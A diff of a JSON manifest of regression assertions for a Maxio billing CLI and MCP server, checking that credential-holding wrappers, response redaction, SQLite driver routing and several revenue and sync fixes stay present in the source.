+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"MAXIO_API_KEY\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func showBaseURL(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "holdProfileStoresUnder(args)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/credkit_paths.go",
+     "contains": "func ReadPaths(configPath string) ([]string, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/maxio-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/maxio-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/maxio-cli/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/cmd/maxio-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/cmd/maxio-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
+     "contains": "credkit.Exit(run())",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/cmd/maxio-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
+     "file": "cli/cmd/maxio-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools),",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/cmd/maxio-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
+     "file": "cli/cmd/maxio-mcp/main.go",
+     "contains": "server.NewStdioServer(s).Listen(ctx, credkit.MCPIn(os.Stdin), credkit.MCPOut())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/maxio-mcp/main.go",
+     "not_contains": "server.ServeStdio("
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "var OutboundGuard = credkit.Transport",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
+     "contains": "httpClient.Transport = OutboundGuard(httpClient.Transport)",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
+     "contains": "c.Transport = OutboundGuard(c.Transport)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return &http.Client{Transport: credkit.Transport(tr)}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.Hold(\"minted:authorization\", cliutil.AuthHeaderHeldParts(authHeader)...)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "_ = credkit.WriteFile(cacheFile, []byte(data), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "os.WriteFile("
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "credkit.Hold(\"stdin\", token)",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
+     "contains": "return credkit.Terminal(f)",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "err := credkit.RunCommand(cmd)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/darwin_acl_darwin.go",
+     "contains": "err := credkit.RunCommand(cmd)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "credkit.WriteFile(tmp, body, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "credkit.WriteFile(path, ",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "credkit.WriteFile(tmp, data, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cache/cache.go",
+     "contains": "credkit.WriteFile(s.path(key), []byte(value), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "func AtomicWriteCredentialFile(path string, data []byte, fileMode, dirMode os.FileMode) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "credkit.WriteFile(tmpPath, data, fileMode)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "AtomicWriteCredentialFile(path, data, 0o600, 0o700)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.AtomicWriteCredentialFile(",
+     "min_count": 3,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/credkit_seam_test.go",
+     "contains": "client.OutboundGuard = func(rt http.RoundTripper) http.RoundTripper { return rt }",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations_test.go",
+     "contains": "func TestShownBaseIsTheConfigTheProgramUses(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitClassHolderIncompleteOnOutboundRefusal(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitClassCredentialSentOverPlaintextHTTP(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitClassCredentialPersistedOutsideTheStore(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitClassReplacementProtocolFrameLeaksCredentials(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitClassHolderIncompleteForMalformedTOML(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitClassOneCharacterCredentialLeaks(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitClassRealCredentialMistakenForAnEncodedNeedle(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitClassCredentialProvenanceNeverPromoted(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitSavedProfileCredentialsAreHeld(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitCredentialsReachTheSelectedConfigBase(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/kit_classes_test.go",
+     "contains": "func TestKitMCPUnknownToolNeverEchoesHTTP(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "CredentialFields: append([]string{\"token\"}, credentialFields...),",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Every SQLite handle goes through credkit.SQLDriver: internal/credsql registers the one driver and every sql.Open in store.go and platform/migration.go names it, the read-only opener included, which runs \"select 1\" because the kit's connection does not forward Ping. The MCP sql value cap moved from sqlite.Limit on a held connection to a DSN parameter (store.OpenReadOnlyValueCapped).",
+   "why": "A reprint regenerates store.go, migration.go and mcp/tools.go with sql.Open(\"sqlite\") and sqlite.Limit, which would let a held credential reach the data db unchecked (class credential-persisted-outside-the-store).",
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(dbPath string, maxValueBytes int) (*Store, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "db.ExecContext(ctx, \"select 1\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit("
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "openMCPReadOnlyStore(path, mcpSQLMaxValueBytes)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-mcphttp-outermost",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credkit.MCPHTTP writes every response the MCP HTTP server serves, refusals included. requireBearerAuthWithLimits runs a preflight that writes nothing (Origin, bearer, bounded body read), then credkit.MCPHTTP around a gate that answers the refusal it decided.",
+   "why": "A 401 or 413 written before the kit sees it is a frame the kit never checked (class replacement-protocol-frame-leaks-credentials, HTTP side); a reprint restores rejectMCPHTTPRequest, which writes outside the kit.",
+   "asserts": [
+    {
+     "file": "cli/cmd/maxio-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/maxio-mcp/main.go",
+     "contains": "func mcpHTTPPreflight(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/maxio-mcp/main.go",
+     "not_contains": "func rejectMCPHTTPRequest("
+    }
+   ]
+  },
+  {
+   "id": "credential-stdin-held",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "A --stdin request body is read before the command runs and its credential fields are held through credkit.HoldBody, then fed back to the command unchanged. A plain create's echo still prints and a pretty-printed body still works.",
+   "why": "Kit StdinFlags holds whole lines, which withholds a create's own response and refuses a pretty-printed body; exchange-online is the precedent.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "holdStdinBody(args)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestStdinBodyIsHeldAndItsPlainEchoPrints(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "response-credentials-redacted",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "A response's card, bank and token fields (the seven credentialFields, the vault references and the webhook signatures) are replaced right after the body is decoded in client.do, so no sink sees them and an ordinary subscription list is not withheld whole. The seven are held too; a vault reference or signature is not held, because a gateway's value can be as short as 1.",
+   "why": "Maxio returns vault_token on every subscription with a card: withholding the unit would make ordinary list commands unusable, and holding a value of 1 would withhold any output with that word.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "respBody = cliutil.RedactResponseCredentials(respBody)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/maxio_credential_names.go",
+     "contains": "func RedactResponseCredentials(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestCredentialFieldsInAnOrdinaryListAreRedactedNotWithheld(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credential-positional-held",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "A positional argument whose usage name is a credential (one-time-tokens <chargify_token>) is held before the command runs.",
+   "why": "The token is a path value, and an API error or a response can repeat the path.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "holdCredentialPositionals(rootCmd, os.Args[1:])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_positional_hold.go",
+     "contains": "func holdCredentialPositionals(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestOneTimeTokenPositionalIsHeld(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "site-required",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The spec's example subdomain is no one's site: outside the verify and dogfood modes, an unset MAXIO_SITE stays unset, buildURL names the variable, and no request or key is sent.",
+   "why": "The generated default would send the operator's key to https://subdomain.chargify.com, a host they do not own.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "(cliutil.IsVerifyEnv() || cliutil.IsDogfoodEnv())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestSiteNeverMovesTheKey(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r2-consolidated-invoice-double-counted",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "Billed sums (revenue-mix and reconcile) leave out a consolidated parent invoice whose child segment is stored, through one bound list, revenue.SupersededParentsArg. A parent with no stored child still counts: it is the only record of the bill.",
+   "why": "InvoiceConsolidationLevel: a parent has no lines of its own and totals that aggregate its segments, so with sync --param consolidation_level=parent,child the amount was counted twice.",
+   "asserts": [
+    {
+     "file": "cli/internal/revenue/maxio_review_r1.go",
+     "contains": "func SupersededParentsArg(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/revenue_mix.go",
+     "contains": "NOT IN (SELECT value FROM json_each(?))",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "NOT IN (SELECT value FROM json_each(?))",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_r1_revenue_test.go",
+     "contains": "func TestConsolidatedParentIsNotCountedOnTopOfItsChild(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -601,6 +1787,160 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "no-response-cache",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "Every CLI client is built with the on-disk response cache off, so a command re-run within five minutes reads the API's current answer.",
+   "why": "mrr sync and mrr now answered from the 5-minute cache: a changed site MRR was missed and the stale figure was saved under a fresh snapshot time (adversarial review, maxio 4.34.2 reprint).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "c.NoCache = true",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_r3_test.go",
+     "contains": "func TestRevenueCommandsNeverAnswerFromTheResponseCache(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "incremental-window-site-zone",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "An incremental sync's date-only bound is one day before the UTC date of the last sync, and endpoints whose date_field takes updated_at filter on it. A user's own date window (start_date, end_date and the datetime forms) replaces the stored bound, so every run asks what the first asked, and a user start bound under --since drops that date_field.",
+   "why": "Maxio reads start_date as midnight in the site's time zone and filters on a creation or issue date by default (spec.json /subscriptions.json, /invoices.json, /customers.json): evening changes at sites west of UTC, and every change to an older record, were never fetched.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "effectiveSince = siteZoneSinceMargin(effectiveSince, syncResourceSinceParamFormat(resource))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "params[\"date_field\"] = \"updated_at\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_incremental.go",
+     "contains": "func siteZoneSinceMargin(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_r3_test.go",
+     "contains": "func TestIncrementalSyncCoversEverySiteZoneAndUpdates(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "dropUpdatedAtUnderUserWindow(userParams, resource, params)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if sinceTS == \"\" && userSyncParam(userParams, resource, userDateWindowKeys...) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-bound-moves-only-on-covering-run",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "The stored sync time moves only when the run covered everything since it: never after a run with a user param (a date window or any other filter) or a --since later than the stored time. Such a run also neither reads nor writes the resume cursor.",
+   "why": "The stored time asserts every change since it was seen, and the checkpoint is shared across filters. A narrowed run moved it, so the next plain sync started after it and an older record changed in between (a voided invoice) stayed stale until a --full run. A cursor left by a narrowed run also made the next plain sync skip that query's first pages and still read as complete.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "plainQuery, coversStored := syncRunReach(userParams, resource, sinceTS, sinceParam, lastSynced)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if !coversStored {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "finalCursor = persistedCursor",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "savedCursor = persistedCursor",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_incremental.go",
+     "contains": "func syncRunReach(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_r3_test.go",
+     "contains": "func TestOnlyARunCoveringTheStoredBoundMovesIt(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "line-item-kind-usage",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "revenue-mix counts every usage kind spec.json LineItemKind documents (metered, prepaid usage and event-based components) as usage.",
+   "why": "prepaid_usage_component and event_based_component lines were counted as services.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/revenue_mix.go",
+     "contains": "\"prepaid_usage_component\", \"event_based_component\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_r3_test.go",
+     "contains": "func TestEveryDocumentedUsageKindIsUsage(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
